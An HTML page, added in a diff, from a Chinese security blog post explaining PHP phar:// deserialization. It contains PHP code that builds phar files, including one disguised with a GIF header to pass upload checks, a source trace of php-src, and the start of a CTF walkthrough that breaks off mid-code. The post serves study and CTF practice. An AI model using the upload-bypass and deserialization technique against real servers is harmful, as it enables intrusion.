@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x01 起源最近工作真的是忙到吐了，很多想学的，想研究的都没得时间，感觉自己真的是好菜好菜。会想写这个的原因是因为最近很多CTF比赛中的题目都涉及到通过 phar 构造反序列化这个议题。而这个议题今年 BlackHat 大会上的 Sam Thomas 分享的 File Operation Induced Unserialization via the “phar://” Stream Wrapp">
+<meta name="keywords" content="php,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="重新认识反序列化-Phar">
+<meta property="og:url" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/index.html">
+<meta property="og:site_name" content="l1nk3r&#39;s blog">
+<meta property="og:description" content="0x01 起源最近工作真的是忙到吐了，很多想学的，想研究的都没得时间，感觉自己真的是好菜好菜。会想写这个的原因是因为最近很多CTF比赛中的题目都涉及到通过 phar 构造反序列化这个议题。而这个议题今年 BlackHat 大会上的 Sam Thomas 分享的 File Operation Induced Unserialization via the “phar://” Stream Wrapp">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/2.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/1.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/3.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/4.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/5.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/6.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/7.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/8.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/9.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/10.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/13.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/15.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/14.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/17.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/18.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/19.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/20.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/21.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/11.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/12.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/24.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/25.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/26.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/27.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/28.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/29.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/31.png">
+<meta property="og:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/30.png">
+<meta property="og:updated_time" content="2018-11-07T03:16:50.851Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="重新认识反序列化-Phar">
+<meta name="twitter:description" content="0x01 起源最近工作真的是忙到吐了，很多想学的，想研究的都没得时间，感觉自己真的是好菜好菜。会想写这个的原因是因为最近很多CTF比赛中的题目都涉及到通过 phar 构造反序列化这个议题。而这个议题今年 BlackHat 大会上的 Sam Thomas 分享的 File Operation Induced Unserialization via the “phar://” Stream Wrapp">
+<meta name="twitter:image" content="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/2.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>重新认识反序列化-Phar | l1nk3r's blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">l1nk3r's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-friends">
+    <a href="/Friends" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Friends</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="l1nk3r">
+      <meta itemprop="description" content="愿你出走半生，归来仍是少年">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1nk3r's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">重新认识反序列化-Phar
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2018-11-07 10:35:53 / Modified: 11:16:50" itemprop="dateCreated datePublished" datetime="2018-11-07T10:35:53+08:00">2018-11-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/07/重新认识反序列化-Phar/" class="leancloud_visitors" data-flag-title="重新认识反序列化-Phar">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Views: </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x01-起源"><a href="#0x01-起源" class="headerlink" title="0x01 起源"></a>0x01 起源</h2><p>最近工作真的是忙到吐了，很多想学的，想研究的都没得时间，感觉自己真的是好菜好菜。会想写这个的原因是因为最近很多CTF比赛中的题目都涉及到通过 <strong>phar</strong> 构造反序列化这个议题。而这个议题今年 <strong>BlackHat</strong> 大会上的 <strong>Sam Thomas</strong> 分享的 <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">File Operation Induced Unserialization via the “phar://” Stream Wrapper</a> 。</p>
+<p>通常我们在PHP下使用反序列化漏洞的时候，只能先找到 <strong>反序列化的点-&gt;可利用函数-&gt;构造反序列化的POP链-&gt;达到目的</strong> 。而该研究员指出该方法在 <strong>文件系统函数</strong> （ <strong>file_get_contents</strong> 、 <strong>unlink</strong> 等）参数可控的情况下，配合 <strong>phar://伪协议</strong> ，可以不依赖反序列化函数 <strong>unserialize()</strong> 直接进行反序列化的操作。</p>
+<a id="more"></a> 
+<h2 id="0x02-原理分析"><a href="#0x02-原理分析" class="headerlink" title="0x02 原理分析"></a>0x02 原理分析</h2><h3 id="一、何为phar文件"><a href="#一、何为phar文件" class="headerlink" title="一、何为phar文件"></a>一、何为phar文件</h3><p>在了解原理之前，我们查询了一下官方手册，手册里针对 <strong>phar://</strong> 这个伪协议是这样<a href="http://php.net/manual/en/intro.phar.php" target="_blank" rel="noopener">介绍</a>的。</p>
+<blockquote>
+<p>Phar archives are best characterized as a convenient way to group several files into a single file. As such, a phar archive provides a way to distribute a complete PHP application in a single file and run it from that file without the need to extract it to disk. Additionally, phar archives can be executed by PHP as easily as any other file, both on the commandline and from a web server. Phar is kind of like a thumb drive for PHP applications.</p>
+</blockquote>
+<p>简单理解 <strong>phar://</strong> 就是一个类似 <strong>file://</strong> 的流包装器，它的作用可以使得多个文件归档到统一文件，并且在不经过解压的情况下被php所访问，并且执行。</p>
+<p>我们来看一下如何制作一个phar文件，具体介绍在<a href="http://php.net/manual/zh/phar.fileformat.phar.php" target="_blank" rel="noopener">这里</a></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/2.png" alt="img"></p>
+<p>大体来说 <strong>Phar</strong> 结构由4部分组成</p>
+<ul>
+<li><strong>stub</strong> ：phar文件标识</li>
+</ul>
+<blockquote>
+<p>A stub must contain as a minimum, the <em>__HALT_COMPILER();</em> token at its conclusion。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure>
+<p>从描述来看这里似乎有点小问题， <strong>phar</strong> 文件必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 <strong>phar</strong> 这函数识别利用。</p>
+<ul>
+<li><strong>manifest</strong> ：压缩文件的属性等信息；</li>
+</ul>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/1.png" alt="img"></p>
+<p> <strong>phar</strong> 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。当然这部分数据以序列化的形式存储在 <strong>meta-data</strong> 中。</p>
+<ul>
+<li><strong>contents</strong> ：压缩文件的内容；</li>
+<li><strong>signature</strong> ：签名，放在文件末尾；</li>
+</ul>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/3.png" alt="img"></p>
+<p>按照这个文件格式，我们先构造一个 <strong>phar</strong> 文件吧。在构造phar之时需要先要将 <strong>php.ini</strong> 中的 <strong>phar.readonly</strong> 选项设置为 <strong>Off</strong> ，否则无法生成 <strong>phar</strong> 文件。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/4.png" alt="img"></p>
+<p>这里我们通过测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">  	&#125;</span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">	$phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">	$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">	$o -&gt; data=<span class="string">'hello l1nk3r!!!'</span>;</span><br><span class="line">	$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">	$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	<span class="comment">//签名自动计算</span></span><br><span class="line">	$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功创建一个标准的 <strong>phar</strong> 文件。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/5.png" alt="img"></p>
+<p>前面我们刚刚说了，我们可以 <strong>phar</strong> 文件必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，因此假设这里我们构造一个带有图片文件头部的 <strong>phar</strong> 文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">	$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">	$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">	$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">	$o -&gt; data=<span class="string">'hello l1nk3r!!!'</span>;</span><br><span class="line">	$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">	$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">	<span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/6.png" alt="img"></p>
+<p>那么我们看看这个假装自己是图片的phar文件最后的效果。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/7.png" alt="img"></p>
+<p>成功被识别出文件内容。</p>
+<h3 id="二、为何phar在文件函数中能够反序列化"><a href="#二、为何phar在文件函数中能够反序列化" class="headerlink" title="二、为何phar在文件函数中能够反序列化"></a>二、为何phar在文件函数中能够反序列化</h3><p>首先知道创宇 <strong>seaii师傅</strong> 给出了一些受phar反序列化影响的文件操作函数。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/8.png" alt="img"></p>
+<p>首先为什么phar会反序列化处理文件呢，答案在代码 <strong>php-src/ext/phar/phar.c:618</strong> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)</span><br></pre></td></tr></table></figure>
+<p>但是为什么 <strong>Phar</strong> 在文件操作中能够成功反序列化呢，这个问题应该需要看到源代码才能解答，ZSX师傅的博客<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">《Phar与Stream Wrapper造成PHP RCE的深入挖掘》</a>已经详细介绍了这个问题，不过既然是学习就需要自己跟进一下。首先先看看 <strong>file_get_content</strong> 等文件函数，基本上都写在了 <strong>php-src/ext/standard/file.c</strong> 这个文件中，截取一下部分相关代码：</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/9.png" alt="img"></p>
+<p>从来代码来看应该是调用了 <strong>php_stream</strong> 系列API来打开一个文件 。从PHP的这篇文档：<a href="https://secure.php.net/manual/zh/internals2.ze1.streams.php" target="_blank" rel="noopener">Streams API for PHP Extension Authors</a>，了解到Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。我们可以使用<code>stream_get_wrapper</code>看到系统内注册了哪一些wrapper，就看到这个 <strong>phar</strong> </p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/10.png" alt="img"></p>
+<p>那我们来看看我们可以看看phar://这个函数的stream的实现，实现位置在 <strong>php-src/ext/phar/stream.c:37</strong> </p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/13.png" alt="img"></p>
+<p>我们发现这个定义的所有函数都在 <strong>php-src/ext/phar/stream.c</strong> 中实现，并且均调用了 <strong>phar_parse_url</strong> 。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/15.png" alt="img"></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/14.png" alt="img"></p>
+<p>然后我们发现 <strong>phar_parse_url</strong> 实现也在 <strong>php-src/ext/phar/stream.c</strong> 中，调用了 <strong>phar_open_or_create_filename</strong> 函数。而这个函数的实现是在 <strong>php-src/ext/phar/phar.c中：</strong> </p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/17.png" alt="img"></p>
+<p>我们发现最后返回了 <strong>phar_create_or_parse_filename</strong> 这个函数，继续跟进这个函数，它的实现也在 <strong>php-src/ext/phar/phar.c中：</strong></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/18.png" alt="img"></p>
+<p>我们这个函数调用了 <strong>phar_open_from_fp</strong> ，跟进这个函数，实现也在 <strong>php-src/ext/phar/phar.c中：</strong></p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/19.png" alt="img"></p>
+<p>最后可以看到return回了 <strong>phar_parse_pharfile</strong> 函数，继续跟进这个函数，这个函数实现在 <strong>php-src/ext/phar/phar.c</strong> 中：</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/20.png" alt="img"></p>
+<p>这个函数调用了 <strong>phar_parse_metadata</strong> 函数，而 <strong>phar_parse_metadata</strong> 实现中就调用了<strong>php_var_unserialize</strong> 实现发序列化。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/21.png" alt="img"></p>
+<p>从刚刚到这里有点乱，稍微总结一下，<strong>phar</strong> 这个函数注册 <strong>stream wrapper</strong> 定义了一些文件操作例如，删除、移动、创建等。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phar_wrapper_open_url,</span><br><span class="line"><span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_close */</span></span><br><span class="line"><span class="literal">NULL</span>,                  <span class="comment">/* phar_wrapper_stat, */</span></span><br><span class="line">phar_wrapper_stat,     <span class="comment">/* stat_url */</span></span><br><span class="line">phar_wrapper_open_dir, <span class="comment">/* opendir */</span></span><br><span class="line"><span class="string">"phar"</span>,</span><br><span class="line">phar_wrapper_unlink,   <span class="comment">/* unlink */</span></span><br><span class="line">phar_wrapper_rename,   <span class="comment">/* rename */</span></span><br><span class="line">phar_wrapper_mkdir,    <span class="comment">/* create directory */</span></span><br><span class="line">phar_wrapper_rmdir,    <span class="comment">/* remove directory */</span></span><br></pre></td></tr></table></figure>
+<p>从我们刚刚分析过程中发现这些函数实现过程中的函数调用链是这样的:</p>
+<p> <strong>phar_parse_url</strong> -&gt; <strong>phar_open_or_create_filename</strong> -&gt; <strong>phar_create_or_parse_filename</strong> -&gt; <strong>phar_open_from_fp</strong> -&gt; <strong>phar_parse_pharfile</strong> -&gt; <strong>phar_parse_metadata</strong> -&gt; <strong>php_var_unserialize</strong> </p>
+<p>因此这样分析下来只要和文件操作有关的函数均能触发反序列化。</p>
+<h3 id="三、进一步探究"><a href="#三、进一步探究" class="headerlink" title="三、进一步探究"></a>三、进一步探究</h3><p>本来这里实际上已经解决了我们提出的为什么phar能够在文件操作函数中进行反序列化，但是看完ZSX师傅的文章之后，只能说，师傅牛逼。</p>
+<p>对于 <strong>stream wrapper</strong> 的作用，可以在 <strong>php-src/main/php_streams.h:132</strong> 找到结构体的定义。</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/11.png" alt="img"></p>
+<p>简单来看就是一些文件（夹）的创建，修改，删除，移动以及获取文件的metadata都需要用到注册这个 <strong>stream wrapper</strong> 。</p>
+<p>前面我们已经提及了 <strong>file_get_contents</strong> 这个函数调用了 <strong>php_stream_open_wrapper_ex</strong> </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stream = php_stream_open_wrapper_ex(filename, <span class="string">"rb"</span>, (use_include_path ? USE_PATH : <span class="number">0</span>) | REPORT_ERRORS,<span class="literal">NULL</span>, context);</span><br></pre></td></tr></table></figure>
+<p>而 <strong>unlink</strong> 函数的定义在 <strong>php-src/ext/standard/file.c:1517</strong> ，调用了 <strong>php_stream_locate_url_wrapper</strong> 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapper = php_stream_locate_url_wrapper(filename, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p> <strong>php_stream_open_wrapper_ex</strong> 的实现在 <strong>php-src/main/streams/streams.c:67375</strong> 中，我们看下代码：</p>
+<p><img src="/2018/11/07/重新认识反序列化-Phar/12.png" alt="img"></p>
+<p>依然是调用 <strong>php_stream_locate_url_wrapper</strong> 。所以之前我们知道所有文件操作函数都有一个共同的特征是 <strong>php_stream_locate_url_wrapper</strong> ，那么如果带有这个特征的函数时候都能使用 <strong>phar</strong> 来造成反序列化。当然最后ZSX师傅在他的博客中已经给出了一些他找到的有趣的利用方式。</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>这里选择<a href="https://github.com/sco4x0/huwangbei2018_easy_laravel" target="_blank" rel="noopener">护网杯 2018 easy_laravel</a>的题目来复现，当时做的时候没做出来，现在重新回头来看看。环境搭建的话。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/sco4x0/huwangbei2018_easy_laravel.git</span><br><span class="line">cd huwangbei2018_easy_laravel</span><br><span class="line">docker build -t &apos;hwb_easy_laravel&apos; .</span><br><span class="line">docker images </span><br><span class="line">docker run -id --name &apos;easy_laravel&apos; -m &apos;1G&apos; --network=&apos;bridge&apos; -p &apos;80&apos;:80 &apos;hwb_easy_laravel&apos;</span><br></pre></td></tr></table></figure>
+<p>作为代码审计题目，一般需要看一下路由，一般基于laravel开发的，路由文件在routes/web.php下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; <span class="keyword">return</span> view(<span class="string">'welcome'</span>); &#125;);</span><br><span class="line">Auth::routes();</span><br><span class="line">Route::get(<span class="string">'/home'</span>, <span class="string">'HomeController@index'</span>);</span><br><span class="line">Route::get(<span class="string">'/note'</span>, <span class="string">'NoteController@index'</span>)-&gt;name(<span class="string">'note'</span>);</span><br><span class="line">Route::get(<span class="string">'/upload'</span>, <span class="string">'UploadController@index'</span>)-&gt;name(<span class="string">'upload'</span>);</span><br><span class="line">Route::post(<span class="string">'/upload'</span>, <span class="string">'UploadController@upload'</span>)-&gt;name(<span class="string">'upload'</span>);</span><br><span class="line">Route::get(<span class="string">'/flag'</span>, <span class="string">'FlagController@showFlag'</span>)-&gt;name(<span class="string">'flag'</span>);</span><br><span class="line">Route::get(<span class="string">'/files'</span>, <span class="string">'UploadController@files'</span>)-&gt;name(<span class="string">'files'</span>);</span><br><span class="line">Route::post(<span class="string">'/check'</span>, <span 